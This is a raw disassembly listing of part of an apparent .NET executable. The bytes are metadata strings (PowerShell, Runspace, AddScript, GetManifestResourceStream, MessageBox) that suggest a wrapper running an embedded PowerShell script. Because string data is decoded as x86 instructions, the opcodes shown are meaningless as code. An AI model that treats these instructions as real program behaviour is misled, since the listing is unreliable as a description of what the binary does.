  4086d6:	75 6c                	jne    0x408744
  4086d8:	74 56                	je     0x408730
  4086da:	61                   	popa
  4086db:	6c                   	insb   (%dx),%es:(%edi)
  4086dc:	75 65                	jne    0x408743
  4086de:	00 45 78             	add    %al,0x78(%ebp)
  4086e1:	63 65 70             	arpl   %esp,0x70(%ebp)
  4086e4:	74 69                	je     0x40874f
  4086e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e8:	00 54 6f 43          	add    %dl,0x43(%edi,%ebp,2)
  4086ec:	68 61 72 41 72       	push   $0x72417261
  4086f1:	72 61                	jb     0x408754
  4086f3:	79 00                	jns    0x4086f5
  4086f5:	41                   	inc    %ecx
  4086f6:	70 70                	jo     0x408768
  4086f8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086fa:	64 43                	fs inc %ebx
  4086fc:	68 61 72 00 43       	push   $0x43007261
  408701:	6f                   	outsl  %ds:(%esi),(%dx)
  408702:	6e                   	outsb  %ds:(%esi),(%dx)
  408703:	73 6f                	jae    0x408774
  408705:	6c                   	insb   (%dx),%es:(%edi)
  408706:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40870a:	6e                   	outsb  %ds:(%esi),(%dx)
  40870b:	73 6f                	jae    0x40877c
  40870d:	6c                   	insb   (%dx),%es:(%edi)
  40870e:	65 4b                	gs dec %ebx
  408710:	65 79 49             	gs jns 0x40875c
  408713:	6e                   	outsb  %ds:(%esi),(%dx)
  408714:	66 6f                	outsw  %ds:(%esi),(%dx)
  408716:	00 43 6f             	add    %al,0x6f(%ebx)
  408719:	6e                   	outsb  %ds:(%esi),(%dx)
  40871a:	73 6f                	jae    0x40878b
  40871c:	6c                   	insb   (%dx),%es:(%edi)
  40871d:	65 4b                	gs dec %ebx
  40871f:	65 79 00             	gs jns 0x408722
  408722:	67 65 74 5f          	addr16 gs je 0x408785
  408726:	4b                   	dec    %ebx
  408727:	65 79 00             	gs jns 0x40872a
  40872a:	67 65 74 5f          	addr16 gs je 0x40878d
  40872e:	4c                   	dec    %esp
  40872f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408731:	67 74 68             	addr16 je 0x40879c
  408734:	00 67 65             	add    %ah,0x65(%edi)
  408737:	74 5f                	je     0x408798
  408739:	4b                   	dec    %ebx
  40873a:	65 79 43             	gs jns 0x408780
  40873d:	68 61 72 00 53       	push   $0x53007261
  408742:	79 73                	jns    0x4087b7
  408744:	74 65                	je     0x4087ab
  408746:	6d                   	insl   (%dx),%es:(%edi)
  408747:	2e 54                	cs push %esp
  408749:	68 72 65 61 64       	push   $0x64616572
  40874e:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  408755:	65 61                	gs popa
  408757:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40875b:	74 5f                	je     0x4087bc
  40875d:	43                   	inc    %ebx
  40875e:	75 72                	jne    0x4087d2
  408760:	72 65                	jb     0x4087c7
  408762:	6e                   	outsb  %ds:(%esi),(%dx)
  408763:	74 54                	je     0x4087b9
  408765:	68 72 65 61 64       	push   $0x64616572
  40876a:	00 4e 65             	add    %cl,0x65(%esi)
  40876d:	77 47                	ja     0x4087b6
  40876f:	75 69                	jne    0x4087da
  408771:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408775:	50                   	push   %eax
  408776:	53                   	push   %ebx
  408777:	4f                   	dec    %edi
  408778:	62 6a 65             	bound  %ebp,0x65(%edx)
  40877b:	63 74 00 41          	arpl   %esi,0x41(%eax,%eax,1)
  40877f:	72 67                	jb     0x4087e8
  408781:	75 6d                	jne    0x4087f0
  408783:	65 6e                	outsb  %gs:(%esi),(%dx)
  408785:	74 4e                	je     0x4087d5
  408787:	75 6c                	jne    0x4087f5
  408789:	6c                   	insb   (%dx),%es:(%edi)
  40878a:	45                   	inc    %ebp
  40878b:	78 63                	js     0x4087f0
  40878d:	65 70 74             	gs jo  0x408804
  408790:	69 6f 6e 00 53 54 41 	imul   $0x41545300,0x6e(%edi),%ebp
  408797:	54                   	push   %esp
  408798:	68 72 65 61 64       	push   $0x64616572
  40879d:	41                   	inc    %ecx
  40879e:	74 74                	je     0x408814
  4087a0:	72 69                	jb     0x40880b
  4087a2:	62 75 74             	bound  %esi,0x74(%ebp)
  4087a5:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  4087a9:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4087ac:	44                   	inc    %esp
  4087ad:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4087b4:	6c                   	insb   (%dx),%es:(%edi)
  4087b5:	61                   	popa
  4087b6:	73 73                	jae    0x40882b
  4087b8:	36 00 4d 61          	add    %cl,%ss:0x61(%ebp)
  4087bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4087bd:	75 61                	jne    0x408820
  4087bf:	6c                   	insb   (%dx),%es:(%edi)
  4087c0:	52                   	push   %edx
  4087c1:	65 73 65             	gs jae 0x408829
  4087c4:	74 45                	je     0x40880b
  4087c6:	76 65                	jbe    0x40882d
  4087c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4087c9:	74 00                	je     0x4087cb
  4087cb:	6d                   	insl   (%dx),%es:(%edi)
  4087cc:	72 65                	jb     0x408833
  4087ce:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  4087d2:	61                   	popa
  4087d3:	41                   	inc    %ecx
  4087d4:	64 64 65 64 45       	fs fs gs fs inc %ebp
  4087d9:	76 65                	jbe    0x408840
  4087db:	6e                   	outsb  %ds:(%esi),(%dx)
  4087dc:	74 41                	je     0x40881f
  4087de:	72 67                	jb     0x408847
  4087e0:	73 00                	jae    0x4087e2
  4087e2:	3c 4d                	cmp    $0x4d,%al
  4087e4:	61                   	popa
  4087e5:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  4087ec:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  4087f3:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4087f6:	31 00                	xor    %eax,(%eax)
  4087f8:	49                   	dec    %ecx
  4087f9:	41                   	inc    %ecx
  4087fa:	73 79                	jae    0x408875
  4087fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4087fd:	63 52 65             	arpl   %edx,0x65(%edx)
  408800:	73 75                	jae    0x408877
  408802:	6c                   	insb   (%dx),%es:(%edi)
  408803:	74 00                	je     0x408805
  408805:	3c 4d                	cmp    $0x4d,%al
  408807:	61                   	popa
  408808:	69 6e 3e 62 5f 5f 32 	imul   $0x325f5f62,0x3e(%esi),%ebp
  40880f:	00 61 72             	add    %ah,0x72(%ecx)
  408812:	00 50 53             	add    %dl,0x53(%eax)
  408815:	44                   	inc    %esp
  408816:	61                   	popa
  408817:	74 61                	je     0x40887a
  408819:	43                   	inc    %ebx
  40881a:	6f                   	outsl  %ds:(%esi),(%dx)
  40881b:	6c                   	insb   (%dx),%es:(%edi)
  40881c:	6c                   	insb   (%dx),%es:(%edi)
  40881d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408822:	6e                   	outsb  %ds:(%esi),(%dx)
  408823:	60                   	pusha
  408824:	31 00                	xor    %eax,(%eax)
  408826:	45                   	inc    %ebp
  408827:	72 72                	jb     0x40889b
  408829:	6f                   	outsl  %ds:(%esi),(%dx)
  40882a:	72 52                	jb     0x40887e
  40882c:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  408830:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408834:	74 5f                	je     0x408895
  408836:	49                   	dec    %ecx
  408837:	6e                   	outsb  %ds:(%esi),(%dx)
  408838:	64 65 78 00          	fs gs js 0x40883c
  40883c:	67 65 74 5f          	addr16 gs je 0x40889f
  408840:	45                   	inc    %ebp
  408841:	78 63                	js     0x4088a6
  408843:	65 70 74             	gs jo  0x4088ba
  408846:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40884d:	5f                   	pop    %edi
  40884e:	4d                   	dec    %ebp
  40884f:	65 73 73             	gs jae 0x4088c5
  408852:	61                   	popa
  408853:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  408858:	74 5f                	je     0x4088b9
  40885a:	49                   	dec    %ecx
  40885b:	73 43                	jae    0x4088a0
  40885d:	6f                   	outsl  %ds:(%esi),(%dx)
  40885e:	6d                   	insl   (%dx),%es:(%edi)
  40885f:	70 6c                	jo     0x4088cd
  408861:	65 74 65             	gs je  0x4088c9
  408864:	64 00 45 76          	add    %al,%fs:0x76(%ebp)
  408868:	65 6e                	outsb  %gs:(%esi),(%dx)
  40886a:	74 57                	je     0x4088c3
  40886c:	61                   	popa
  40886d:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408874:	65 
  408875:	00 53 65             	add    %dl,0x65(%ebx)
  408878:	74 00                	je     0x40887a
  40887a:	45                   	inc    %ebp
  40887b:	6e                   	outsb  %ds:(%esi),(%dx)
  40887c:	61                   	popa
  40887d:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  408881:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  408888:	79 6c                	jns    0x4088f6
  40888a:	65 73 00             	gs jae 0x40888d
  40888d:	55                   	push   %ebp
  40888e:	6e                   	outsb  %ds:(%esi),(%dx)
  40888f:	68 61 6e 64 6c       	push   $0x6c646e61
  408894:	65 64 45             	gs fs inc %ebp
  408897:	78 63                	js     0x4088fc
  408899:	65 70 74             	gs jo  0x408910
  40889c:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  4088a3:	74 48                	je     0x4088ed
  4088a5:	61                   	popa
  4088a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a7:	64 6c                	fs insb (%dx),%es:(%edi)
  4088a9:	65 72 00             	gs jb  0x4088ac
  4088ac:	61                   	popa
  4088ad:	64 64 5f             	fs fs pop %edi
  4088b0:	55                   	push   %ebp
  4088b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b2:	68 61 6e 64 6c       	push   $0x6c646e61
  4088b7:	65 64 45             	gs fs inc %ebp
  4088ba:	78 63                	js     0x40891f
  4088bc:	65 70 74             	gs jo  0x408933
  4088bf:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4088c6:	74 65                	je     0x40892d
  4088c8:	6d                   	insl   (%dx),%es:(%edi)
  4088c9:	2e 4d                	cs dec %ebp
  4088cb:	61                   	popa
  4088cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4088cd:	61                   	popa
  4088ce:	67 65 6d             	gs insl (%dx),%es:(%di)
  4088d1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4088d3:	74 2e                	je     0x408903
  4088d5:	41                   	inc    %ecx
  4088d6:	75 74                	jne    0x40894c
  4088d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d9:	6d                   	insl   (%dx),%es:(%edi)
  4088da:	61                   	popa
  4088db:	74 69                	je     0x408946
  4088dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4088de:	6e                   	outsb  %ds:(%esi),(%dx)
  4088df:	2e 52                	cs push %edx
  4088e1:	75 6e                	jne    0x408951
  4088e3:	73 70                	jae    0x408955
  4088e5:	61                   	popa
  4088e6:	63 65 73             	arpl   %esp,0x73(%ebp)
  4088e9:	00 52 75             	add    %dl,0x75(%edx)
  4088ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ed:	73 70                	jae    0x40895f
  4088ef:	61                   	popa
  4088f0:	63 65 46             	arpl   %esp,0x46(%ebp)
  4088f3:	61                   	popa
  4088f4:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4088f8:	79 00                	jns    0x4088fa
  4088fa:	52                   	push   %edx
  4088fb:	75 6e                	jne    0x40896b
  4088fd:	73 70                	jae    0x40896f
  4088ff:	61                   	popa
  408900:	63 65 00             	arpl   %esp,0x0(%ebp)
  408903:	43                   	inc    %ebx
  408904:	72 65                	jb     0x40896b
  408906:	61                   	popa
  408907:	74 65                	je     0x40896e
  408909:	52                   	push   %edx
  40890a:	75 6e                	jne    0x40897a
  40890c:	73 70                	jae    0x40897e
  40890e:	61                   	popa
  40890f:	63 65 00             	arpl   %esp,0x0(%ebp)
  408912:	41                   	inc    %ecx
  408913:	70 61                	jo     0x408976
  408915:	72 74                	jb     0x40898b
  408917:	6d                   	insl   (%dx),%es:(%edi)
  408918:	65 6e                	outsb  %gs:(%esi),(%dx)
  40891a:	74 53                	je     0x40896f
  40891c:	74 61                	je     0x40897f
  40891e:	74 65                	je     0x408985
  408920:	00 73 65             	add    %dh,0x65(%ebx)
  408923:	74 5f                	je     0x408984
  408925:	41                   	inc    %ecx
  408926:	70 61                	jo     0x408989
  408928:	72 74                	jb     0x40899e
  40892a:	6d                   	insl   (%dx),%es:(%edi)
  40892b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40892d:	74 53                	je     0x408982
  40892f:	74 61                	je     0x408992
  408931:	74 65                	je     0x408998
  408933:	00 4f 70             	add    %cl,0x70(%edi)
  408936:	65 6e                	outsb  %gs:(%esi),(%dx)
  408938:	00 50 6f             	add    %dl,0x6f(%eax)
  40893b:	77 65                	ja     0x4089a2
  40893d:	72 53                	jb     0x408992
  40893f:	68 65 6c 6c 00       	push   $0x6c6c65
  408944:	43                   	inc    %ebx
  408945:	72 65                	jb     0x4089ac
  408947:	61                   	popa
  408948:	74 65                	je     0x4089af
  40894a:	00 73 65             	add    %dh,0x65(%ebx)
  40894d:	74 5f                	je     0x4089ae
  40894f:	52                   	push   %edx
  408950:	75 6e                	jne    0x4089c0
  408952:	73 70                	jae    0x4089c4
  408954:	61                   	popa
  408955:	63 65 00             	arpl   %esp,0x0(%ebp)
  408958:	50                   	push   %eax
  408959:	53                   	push   %ebx
  40895a:	44                   	inc    %esp
  40895b:	61                   	popa
  40895c:	74 61                	je     0x4089bf
  40895e:	53                   	push   %ebx
  40895f:	74 72                	je     0x4089d3
  408961:	65 61                	gs popa
  408963:	6d                   	insl   (%dx),%es:(%edi)
  408964:	73 00                	jae    0x408966
  408966:	67 65 74 5f          	addr16 gs je 0x4089c9
  40896a:	53                   	push   %ebx
  40896b:	74 72                	je     0x4089df
  40896d:	65 61                	gs popa
  40896f:	6d                   	insl   (%dx),%es:(%edi)
  408970:	73 00                	jae    0x408972
  408972:	67 65 74 5f          	addr16 gs je 0x4089d5
  408976:	45                   	inc    %ebp
  408977:	72 72                	jb     0x4089eb
  408979:	6f                   	outsl  %ds:(%esi),(%dx)
  40897a:	72 00                	jb     0x40897c
  40897c:	45                   	inc    %ebp
  40897d:	76 65                	jbe    0x4089e4
  40897f:	6e                   	outsb  %ds:(%esi),(%dx)
  408980:	74 48                	je     0x4089ca
  408982:	61                   	popa
  408983:	6e                   	outsb  %ds:(%esi),(%dx)
  408984:	64 6c                	fs insb (%dx),%es:(%edi)
  408986:	65 72 60             	gs jb  0x4089e9
  408989:	31 00                	xor    %eax,(%eax)
  40898b:	61                   	popa
  40898c:	64 64 5f             	fs fs pop %edi
  40898f:	44                   	inc    %esp
  408990:	61                   	popa
  408991:	74 61                	je     0x4089f4
  408993:	41                   	inc    %ecx
  408994:	64 64 65 64 00 67 65 	fs fs gs add %ah,%fs:0x65(%edi)
  40899b:	74 5f                	je     0x4089fc
  40899d:	49                   	dec    %ecx
  40899e:	73 49                	jae    0x4089e9
  4089a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a1:	70 75                	jo     0x408a18
  4089a3:	74 52                	je     0x4089f7
  4089a5:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  4089ac:	65 64 
  4089ae:	00 43 6f             	add    %al,0x6f(%ebx)
  4089b1:	6d                   	insl   (%dx),%es:(%edi)
  4089b2:	70 6c                	jo     0x408a20
  4089b4:	65 74 65             	gs je  0x408a1c
  4089b7:	00 43 6f             	add    %al,0x6f(%ebx)
  4089ba:	6d                   	insl   (%dx),%es:(%edi)
  4089bb:	70 61                	jo     0x408a1e
  4089bd:	72 65                	jb     0x408a24
  4089bf:	00 53 74             	add    %dl,0x74(%ebx)
  4089c2:	72 69                	jb     0x408a2d
  4089c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c5:	67 43                	addr16 inc %ebx
  4089c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c8:	6d                   	insl   (%dx),%es:(%edi)
  4089c9:	70 61                	jo     0x408a2c
  4089cb:	72 69                	jb     0x408a36
  4089cd:	73 6f                	jae    0x408a3e
  4089cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d0:	00 53 74             	add    %dl,0x74(%ebx)
  4089d3:	61                   	popa
  4089d4:	72 74                	jb     0x408a4a
  4089d6:	73 57                	jae    0x408a2f
  4089d8:	69 74 68 00 53 74 72 	imul   $0x69727453,0x0(%eax,%ebp,2),%esi
  4089df:	69 
  4089e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e1:	67 53                	addr16 push %ebx
  4089e3:	70 6c                	jo     0x408a51
  4089e5:	69 74 4f 70 74 69 6f 	imul   $0x6e6f6974,0x70(%edi,%ecx,2),%esi
  4089ec:	6e 
  4089ed:	73 00                	jae    0x4089ef
  4089ef:	53                   	push   %ebx
  4089f0:	70 6c                	jo     0x408a5e
  4089f2:	69 74 00 4d 65 73 73 	imul   $0x61737365,0x4d(%eax,%eax,1),%esi
  4089f9:	61 
  4089fa:	67 65 42             	addr16 gs inc %edx
  4089fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4089fe:	78 42                	js     0x408a42
  408a00:	75 74                	jne    0x408a76
  408a02:	74 6f                	je     0x408a73
  408a04:	6e                   	outsb  %ds:(%esi),(%dx)
  408a05:	73 00                	jae    0x408a07
  408a07:	4d                   	dec    %ebp
  408a08:	65 73 73             	gs jae 0x408a7e
  408a0b:	61                   	popa
  408a0c:	67 65 42             	addr16 gs inc %edx
  408a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a10:	78 49                	js     0x408a5b
  408a12:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  408a15:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408a19:	6d                   	insl   (%dx),%es:(%edi)
  408a1a:	00 53 79             	add    %dl,0x79(%ebx)
  408a1d:	73 74                	jae    0x408a93
  408a1f:	65 6d                	gs insl (%dx),%es:(%edi)
  408a21:	2e 44                	cs inc %esp
  408a23:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408a2a:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  408a31:	75 67                	jne    0x408a9a
  408a33:	67 65 72 00          	addr16 gs jb 0x408a37
  408a37:	4c                   	dec    %esp
  408a38:	61                   	popa
  408a39:	75 6e                	jne    0x408aa9
  408a3b:	63 68 00             	arpl   %ebp,0x0(%eax)
  408a3e:	53                   	push   %ebx
  408a3f:	79 73                	jns    0x408ab4
  408a41:	74 65                	je     0x408aa8
  408a43:	6d                   	insl   (%dx),%es:(%edi)
  408a44:	2e 49                	cs dec %ecx
  408a46:	4f                   	dec    %edi
  408a47:	00 53 74             	add    %dl,0x74(%ebx)
  408a4a:	72 65                	jb     0x408ab1
  408a4c:	61                   	popa
  408a4d:	6d                   	insl   (%dx),%es:(%edi)
  408a4e:	00 47 65             	add    %al,0x65(%edi)
  408a51:	74 4d                	je     0x408aa0
  408a53:	61                   	popa
  408a54:	6e                   	outsb  %ds:(%esi),(%dx)
  408a55:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  408a5c:	73 6f                	jae    0x408acd
  408a5e:	75 72                	jne    0x408ad2
  408a60:	63 65 53             	arpl   %esp,0x53(%ebp)
  408a63:	74 72                	je     0x408ad7
  408a65:	65 61                	gs popa
  408a67:	6d                   	insl   (%dx),%es:(%edi)
  408a68:	00 45 6e             	add    %al,0x6e(%ebp)
  408a6b:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408a6e:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408a75:	5f                   	pop    %edi
  408a76:	55                   	push   %ebp
  408a77:	54                   	push   %esp
  408a78:	46                   	inc    %esi
  408a79:	38 00                	cmp    %al,(%eax)
  408a7b:	53                   	push   %ebx
  408a7c:	74 72                	je     0x408af0
  408a7e:	65 61                	gs popa
  408a80:	6d                   	insl   (%dx),%es:(%edi)
  408a81:	52                   	push   %edx
  408a82:	65 61                	gs popa
  408a84:	64 65 72 00          	fs gs jb 0x408a88
  408a88:	54                   	push   %esp
  408a89:	65 78 74             	gs js  0x408b00
  408a8c:	52                   	push   %edx
  408a8d:	65 61                	gs popa
  408a8f:	64 65 72 00          	fs gs jb 0x408a93
  408a93:	52                   	push   %edx
  408a94:	65 61                	gs popa
  408a96:	64 54                	fs push %esp
  408a98:	6f                   	outsl  %ds:(%esi),(%dx)
  408a99:	45                   	inc    %ebp
  408a9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9b:	64 00 46 69          	add    %al,%fs:0x69(%esi)
  408a9f:	6c                   	insb   (%dx),%es:(%edi)
  408aa0:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408aa4:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  408aab:	65 
  408aac:	78 74                	js     0x408b22
  408aae:	00 41 64             	add    %al,0x64(%ecx)
  408ab1:	64 53                	fs push %ebx
  408ab3:	63 72 69             	arpl   %esi,0x69(%edx)
  408ab6:	70 74                	jo     0x408b2c
  408ab8:	00 53 79             	add    %dl,0x79(%ebx)
  408abb:	73 74                	jae    0x408b31
  408abd:	65 6d                	gs insl (%dx),%es:(%edi)
  408abf:	2e 54                	cs push %esp
  408ac1:	65 78 74             	gs js  0x408b38
  408ac4:	2e 52                	cs push %edx
  408ac6:	65 67 75 6c          	gs addr16 jne 0x408b36
  408aca:	61                   	popa
  408acb:	72 45                	jb     0x408b12
  408acd:	78 70                	js     0x408b3f
  408acf:	72 65                	jb     0x408b36
  408ad1:	73 73                	jae    0x408b46
  408ad3:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  408ada:	67 65 78 00          	addr16 gs js 0x408ade
  408ade:	4d                   	dec    %ebp
  408adf:	61                   	popa
  408ae0:	74 63                	je     0x408b45
  408ae2:	68 00 47 72 6f       	push   $0x6f724700
  408ae7:	75 70                	jne    0x408b59
  408ae9:	00 67 65             	add    %ah,0x65(%edi)
  408aec:	74 5f                	je     0x408b4d
  408aee:	53                   	push   %ebx
  408aef:	75 63                	jne    0x408b54
  408af1:	63 65 73             	arpl   %esp,0x73(%ebp)
  408af4:	73 00                	jae    0x408af6
  408af6:	47                   	inc    %edi
  408af7:	72 6f                	jb     0x408b68
  408af9:	75 70                	jne    0x408b6b
  408afb:	43                   	inc    %ebx
  408afc:	6f                   	outsl  %ds:(%esi),(%dx)
  408afd:	6c                   	insb   (%dx),%es:(%edi)
  408afe:	6c                   	insb   (%dx),%es:(%edi)
  408aff:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408b04:	6e                   	outsb  %ds:(%esi),(%dx)
  408b05:	00 67 65             	add    %ah,0x65(%edi)
  408b08:	74 5f                	je     0x408b69
  408b0a:	47                   	inc    %edi
  408b0b:	72 6f                	jb     0x408b7c
  408b0d:	75 70                	jne    0x408b7f
  408b0f:	73 00                	jae    0x408b11
  408b11:	44                   	inc    %esp
  408b12:	6f                   	outsl  %ds:(%esi),(%dx)
  408b13:	75 62                	jne    0x408b77
  408b15:	6c                   	insb   (%dx),%es:(%edi)
  408b16:	65 00 54 72 79       	add    %dl,%gs:0x79(%edx,%esi,2)
  408b1b:	50                   	push   %eax
  408b1c:	61                   	popa
  408b1d:	72 73                	jb     0x408b92
  408b1f:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  408b23:	64 50                	fs push %eax
  408b25:	61                   	popa
  408b26:	72 61                	jb     0x408b89
  408b28:	6d                   	insl   (%dx),%es:(%edi)
  408b29:	65 74 65             	gs je  0x408b91
  408b2c:	72 00                	jb     0x408b2e
  408b2e:	43                   	inc    %ebx
  408b2f:	61                   	popa
  408b30:	70 74                	jo     0x408ba6
  408b32:	75 72                	jne    0x408ba6
  408b34:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408b38:	74 5f                	je     0x408b99
  408b3a:	56                   	push   %esi
  408b3b:	61                   	popa
  408b3c:	6c                   	insb   (%dx),%es:(%edi)
  408b3d:	75 65                	jne    0x408ba4
  408b3f:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  408b43:	70 70                	jo     0x408bb5
  408b45:	65 72 00             	gs jb  0x408b48
  408b48:	42                   	inc    %edx
  408b49:	6f                   	outsl  %ds:(%esi),(%dx)
  408b4a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b4b:	6c                   	insb   (%dx),%es:(%edi)
  408b4c:	65 61                	gs popa
  408b4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b4f:	00 41 64             	add    %al,0x64(%ecx)
  408b52:	64 41                	fs inc %ecx
  408b54:	72 67                	jb     0x408bbd
  408b56:	75 6d                	jne    0x408bc5
  408b58:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b5a:	74 00                	je     0x408b5c
  408b5c:	41                   	inc    %ecx
  408b5d:	64 64 43             	fs fs inc %ebx
  408b60:	6f                   	outsl  %ds:(%esi),(%dx)
  408b61:	6d                   	insl   (%dx),%es:(%edi)
  408b62:	6d                   	insl   (%dx),%es:(%edi)
  408b63:	61                   	popa
  408b64:	6e                   	outsb  %ds:(%esi),(%dx)
  408b65:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408b69:	79 6e                	jns    0x408bd9
  408b6b:	63 43 61             	arpl   %eax,0x61(%ebx)
  408b6e:	6c                   	insb   (%dx),%es:(%edi)
  408b6f:	6c                   	insb   (%dx),%es:(%edi)
  408b70:	62 61 63             	bound  %esp,0x63(%ecx)
  408b73:	6b 00 50             	imul   $0x50,(%eax),%eax
  408b76:	53                   	push   %ebx
  408b77:	49                   	dec    %ecx
  408b78:	6e                   	outsb  %ds:(%esi),(%dx)
  408b79:	76 6f                	jbe    0x408bea
  408b7b:	63 61 74             	arpl   %esp,0x74(%ecx)
  408b7e:	69 6f 6e 53 65 74 74 	imul   $0x74746553,0x6e(%edi),%ebp
  408b85:	69 6e 67 73 00 42 65 	imul   $0x65420073,0x67(%esi),%ebp
  408b8c:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%bp),%ebp
  408b93:	6b 
  408b94:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  408b98:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408b9f:	65 
  408ba0:	00 57 61             	add    %dl,0x61(%edi)
  408ba3:	69 74 4f 6e 65 00 50 	imul   $0x53500065,0x6e(%edi,%ecx,2),%esi
  408baa:	53 
  408bab:	49                   	dec    %ecx
  408bac:	6e                   	outsb  %ds:(%esi),(%dx)
  408bad:	76 6f                	jbe    0x408c1e
  408baf:	63 61 74             	arpl   %esp,0x74(%ecx)
  408bb2:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408bb9:	65 49                	gs dec %ecx
  408bbb:	6e                   	outsb  %ds:(%esi),(%dx)
  408bbc:	66 6f                	outsw  %ds:(%esi),(%dx)
  408bbe:	00 67 65             	add    %ah,0x65(%edi)
  408bc1:	74 5f                	je     0x408c22
  408bc3:	49                   	dec    %ecx
  408bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc5:	76 6f                	jbe    0x408c36
  408bc7:	63 61 74             	arpl   %esp,0x74(%ecx)
  408bca:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408bd1:	65 49                	gs dec %ecx
  408bd3:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd4:	66 6f                	outsw  %ds:(%esi),(%dx)
  408bd6:	00 50 53             	add    %dl,0x53(%eax)
  408bd9:	49                   	dec    %ecx
  408bda:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdb:	76 6f                	jbe    0x408c4c
  408bdd:	63 61 74             	arpl   %esp,0x74(%ecx)
  408be0:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408be7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408beb:	74 5f                	je     0x408c4c
  408bed:	53                   	push   %ebx
  408bee:	74 61                	je     0x408c51
  408bf0:	74 65                	je     0x408c57
  408bf2:	00 67 65             	add    %ah,0x65(%edi)
  408bf5:	74 5f                	je     0x408c56
  408bf7:	52                   	push   %edx
  408bf8:	65 61                	gs popa
  408bfa:	73 6f                	jae    0x408c6b
  408bfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfd:	00 43 6f             	add    %al,0x6f(%ebx)
  408c00:	6d                   	insl   (%dx),%es:(%edi)
  408c01:	70 69                	jo     0x408c6c
  408c03:	6c                   	insb   (%dx),%es:(%edi)
  408c04:	65 72 47             	gs jb  0x408c4e
  408c07:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c09:	65 72 61             	gs jb  0x408c6d
  408c0c:	74 65                	je     0x408c73
  408c0e:	64 41                	fs inc %ecx
  408c10:	74 74                	je     0x408c86
  408c12:	72 69                	jb     0x408c7d
  408c14:	62 75 74             	bound  %esi,0x74(%ebp)
  408c17:	65 00 74 65 73       	add    %dh,%gs:0x73(%ebp,%eiz,2)
